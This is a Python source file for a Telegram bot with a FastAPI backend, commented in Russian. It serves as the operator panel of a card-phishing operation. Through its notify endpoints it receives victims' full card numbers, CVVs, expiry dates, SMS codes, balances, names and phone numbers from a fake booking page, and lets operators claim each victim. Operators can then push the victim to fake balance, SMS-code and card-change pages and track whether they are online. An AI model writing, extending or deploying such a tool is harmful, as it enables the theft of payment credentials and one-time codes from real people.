# bot.py - Исправленная версия с проверкой онлайн
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from fastapi import FastAPI
import uvicorn
import asyncio
import httpx
import config
import sqlite3
import datetime
from contextlib import contextmanager

bot = Bot(token=config.TOKEN)
dp = Dispatcher()
app = FastAPI()

# Инициализация базы данных
def init_db():
    with sqlite3.connect('logs.db') as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                session_id TEXT PRIMARY KEY,
                masked_pan TEXT,
                booking_id TEXT,
                taken_by INTEGER,
                step TEXT DEFAULT 'full',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()

# Контекстный менеджер для работы с БД
@contextmanager
def get_db_connection():
    conn = sqlite3.connect('logs.db')
    conn.row_factory = sqlite3.Row
    try:
        yield conn
    finally:
        conn.close()

# Уведомление от сервера
@app.post("/notify")
async def notify(data: dict):
    try:
        session_id = data["sessionId"]
        masked_pan = data["maskedPan"]
        booking_id = data.get("bookingId", session_id[:8].upper())
        step = data.get("step", "full")
        
        with get_db_connection() as conn:
            cursor = conn.cursor()
            
            if step == "card_number_only":
                cursor.execute('''
                    INSERT OR REPLACE INTO logs (session_id, masked_pan, booking_id, step, updated_at)
                    VALUES (?, ?, ?, ?, ?)
                ''', (session_id, masked_pan, booking_id, step, datetime.datetime.now()))
                
                card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                
                message_text = (
                    f"🎯 Пользователь ввел карту, приготовиться!\n\n"
                    f"💳 Номер карты:\n"
                    f"🔹 {masked_pan}\n"
                    f"🔹 {card_with_spaces}\n\n"
                    f"⏳ Ожидаем CVV и expiry date..."
                )
                
                await bot.send_message(config.GROUP_ID, message_text)
                
            elif step == "completed":
                cvv = data.get("cvv", "N/A")
                expire_date = data.get("expireDate", "N/A")
                
                cursor.execute('''
                    UPDATE logs 
                    SET masked_pan = ?, step = ?, updated_at = ?
                    WHERE session_id = ?
                ''', (masked_pan, step, datetime.datetime.now(), session_id))
                
                card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                
                message_text = (
                    f"🆔 #{booking_id}\n"
                    f"🔔 Пользователь ожидает 🔔\n\n"
                    f"💳 Номер карты:\n\n"
                    f"🔹 {masked_pan}\n"
                    f"🔹 {card_with_spaces}\n"
                )
                
                kb = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="Взять лог", callback_data=f"take:{session_id}")]
                ])
                
                await bot.send_message(config.GROUP_ID, message_text, reply_markup=kb)
                
            else:
                cursor.execute('''
                    INSERT OR REPLACE INTO logs (session_id, masked_pan, booking_id, step, updated_at)
                    VALUES (?, ?, ?, ?, ?)
                ''', (session_id, masked_pan, booking_id, "full", datetime.datetime.now()))
                
                card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                
                message_text = (
                    f"🆔 #{booking_id}\n"
                    f"🔔 Пользователь ожидает 🔔\n\n"
                    f"💳 Номер карты:\n\n"
                    f"🔹 {masked_pan}\n"
                    f"🔹 {card_with_spaces}\n"
                )
                
                kb = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="Взять лог", callback_data=f"take:{session_id}")]
                ])
                
                await bot.send_message(config.GROUP_ID, message_text, reply_markup=kb)

            conn.commit()

        return {"status": "ok"}
    
    except Exception as e:
        print(f"Error in /notify: {e}")
        return {"status": "error", "message": str(e)}, 500

@app.post("/balance-notify")
async def balance_notify(data: dict):
    session_id = data["sessionId"]
    balance = data["balance"]

    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by, booking_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()

    if log and log['taken_by']:
        await bot.send_message(
            log['taken_by'],
            f"✅ Баланс юзера получен!\n\n💰 Сумма: {balance} AED"
        )
    return {"status": "ok"}

@app.post("/sms-notify")
async def sms_notify(data: dict):
    session_id = data["sessionId"]
    sms = data["sms"]

    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by, booking_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()

    if log and log['taken_by']:
        await bot.send_message(
            log['taken_by'],
            f"✅ Код смс получен!\n\n🔢 Код: {sms}"
        )
    return {"status": "ok"}

@app.post("/change-card-notify")
async def change_card_notify(data: dict):
    session_id = data["sessionId"]
    changed_card = data["changed_card"]
    changed_expire = data["changed_expire"]
    changed_cvv = data["changed_cvv"]

    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by, booking_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()

    if log and log['taken_by']:
        await bot.send_message(
            log['taken_by'],
            f"✅ Юзер изменил карту\n\n🔄💳 Новая карта: {changed_card}\n🔄🗓️ Новый срок действия карты: {changed_expire}\n🔄🔒 Новый CVV: {changed_cvv}"
        )
    return {"status": "ok"}

# Взять лог
@dp.callback_query(F.data.startswith("take:"))
async def take_log(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]

    with get_db_connection() as conn:
        cursor = conn.cursor()
        
        cursor.execute('SELECT taken_by, booking_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
        
        if not log:
            await callback.answer("Лог не найден", show_alert=True)
            return
            
        if log['taken_by']:
            await callback.answer("Этот лог уже занят", show_alert=True)
            return

        cursor.execute('''
            UPDATE logs 
            SET taken_by = ?, updated_at = ?
            WHERE session_id = ?
        ''', (callback.from_user.id, datetime.datetime.now(), session_id))
        conn.commit()

        async with httpx.AsyncClient() as client:
            customer = (await client.get(f"{config.SERVER_URL}/customer/{session_id}")).json()
            card = (await client.get(f"{config.SERVER_URL}/card/{session_id}")).json()
            booking = (await client.get(f"{config.SERVER_URL}/booking/{session_id}")).json()

        booking_id = log['booking_id'] or "N/A"
        
        text = (
            f"Лог #{booking_id}\n\n"
            f"💳  Карта: {card.get('full_pan')}\n"
            f"🗓️  Срок действия карты: {card.get('expire_date')}\n"
            f"🔒  CVV: {card.get('cvv')}\n"
            f"👤  Имя: {customer.get('name')} {customer.get('surname')}\n\n"
            f"📞  Номер: {customer.get('phone')}\n\n"
            f"💸  Сумма: {booking.get('total_amount')}.00 AED"
        )

        management_kb = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="💰 Баланс", callback_data=f"balance:{session_id}"),
                InlineKeyboardButton(text="📞 SMS", callback_data=f"sms:{session_id}")
            ],
            [
                InlineKeyboardButton(text="🔄 Изменить карту", callback_data=f"change:{session_id}"),
                InlineKeyboardButton(text="✅ Успешная оплата", callback_data=f"success:{session_id}")
            ],
            [
                InlineKeyboardButton(text="🔍 Проверить онлайн", callback_data=f"check_online:{session_id}")
            ]
        ])

        await bot.send_message(callback.from_user.id, text, reply_markup=management_kb)
        
        new_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"Лог взял @{callback.from_user.username}", callback_data="already_taken")]
        ])
        
        await callback.message.edit_reply_markup(reply_markup=new_kb)
        await callback.answer()

# НОВЫЙ ОБРАБОТЧИК: Проверка онлайн статуса
# bot.py - ОБНОВЛЕННЫЙ ОБРАБОТЧИК check_online
@dp.callback_query(F.data.startswith("check_online:"))
async def check_online_status(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    # Проверяем доступ
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
        
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("У вас нет доступа к этому логу", show_alert=True)
        return
    
    # Запрашиваем статус с сервера
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(f"{config.SERVER_URL}/check-online-status/{session_id}")
            
            if response.status_code == 200:
                data = response.json()
                
                if data.get("online"):
                    current_page = data.get("currentPageDisplay", "Unknown")
                    
                    await callback.message.answer(
                        f"🟢 Пользователь ОНЛАЙН\n\n"
                        f"📍 Текущая страница: {current_page}\n"
                        f"⏰ Последняя активность: только что"
                    )
                else:
                    last_known_page = data.get("lastKnownPageDisplay", "неизвестно")
                    last_seen = data.get("lastSeen", "неизвестно")
                    
                    await callback.message.answer(
                        f"🔴 Пользователь ОФФЛАЙН\n\n"
                        f"📄 Последняя известная страница: {last_known_page}\n"
                        f"⏰ Последняя активность: {last_seen}"
                    )
            else:
                await callback.message.answer("❌ Не удалось получить статус пользователя")
                
    except Exception as e:
        print(f"Error checking online status: {e}")
        await callback.message.answer("❌ Ошибка соединения с сервером")
    
    await callback.answer()

# Обработчик кнопки "Баланс"
@dp.callback_query(F.data.startswith("balance:"))
async def handle_balance(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
        
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("У вас нет доступа к этому логу", show_alert=True)
        return
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(f"{config.SERVER_URL}/redirect-balance", 
                                       json={"sessionId": session_id})
            
            if response.status_code == 200:
                 await callback.message.answer("✅ Пользователь перенаправлен на страницу баланса")
            else:
                await callback.message.answer("❌ Ошибка перенаправления")
                
    except Exception as e:
        print(f"Error redirecting user: {e}")
        await callback.message.answer("❌ Ошибка соединения с сервером")

# Обработчик кнопки "SMS"
@dp.callback_query(F.data.startswith("sms:"))
async def handle_sms(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
        
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("У вас нет доступа к этому логу", show_alert=True)
        return
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(f"{config.SERVER_URL}/redirect-sms", 
                                       json={"sessionId": session_id})
            
            if response.status_code == 200:
                 await callback.message.answer("✅ Пользователь перенаправлен на страницу ввода кода")
            else:
                await callback.message.answer("❌ Ошибка перенаправления")
                
    except Exception as e:
        print(f"Error redirecting user: {e}")
        await callback.message.answer("❌ Ошибка соединения с сервером")

# Обработчик кнопки "Изменить карту"
@dp.callback_query(F.data.startswith("change:"))
async def handle_change(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
        
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("У вас нет доступа к этому логу", show_alert=True)
        return
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(f"{config.SERVER_URL}/redirect-change", 
                                       json={"sessionId": session_id})
            
            if response.status_code == 200:
                 await callback.message.answer("✅ Пользователь перенаправлен на страницу замены карты")
            else:
                await callback.message.answer("❌ Ошибка перенаправления")
                
    except Exception as e:
        print(f"Error redirecting user: {e}")
        await callback.message.answer("❌ Ошибка соединения с сервером")

@dp.callback_query(F.data.startswith("success:"))
async def handle_success(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
        
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("У вас нет доступа к этому логу", show_alert=True)
        return
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(f"{config.SERVER_URL}/redirect-success", 
                                       json={"sessionId": session_id})
            
            if response.status_code == 200:
                 await callback.message.answer("✅ Успешная оплата!")
            else:
                await callback.message.answer("❌ Ошибка перенаправления")
                
    except Exception as e:
        print(f"Error redirecting user: {e}")
        await callback.message.answer("❌ Ошибка соединения с сервером")

async def main():
    init_db()
    bot_task = asyncio.create_task(dp.start_polling(bot))

    config_uvicorn = uvicorn.Config(app, host="0.0.0.0", port=8000, loop="asyncio")
    server = uvicorn.Server(config_uvicorn)
    server_task = asyncio.create_task(server.serve())

    await asyncio.gather(bot_task, server_task)

if __name__ == "__main__":
    asyncio.run(main())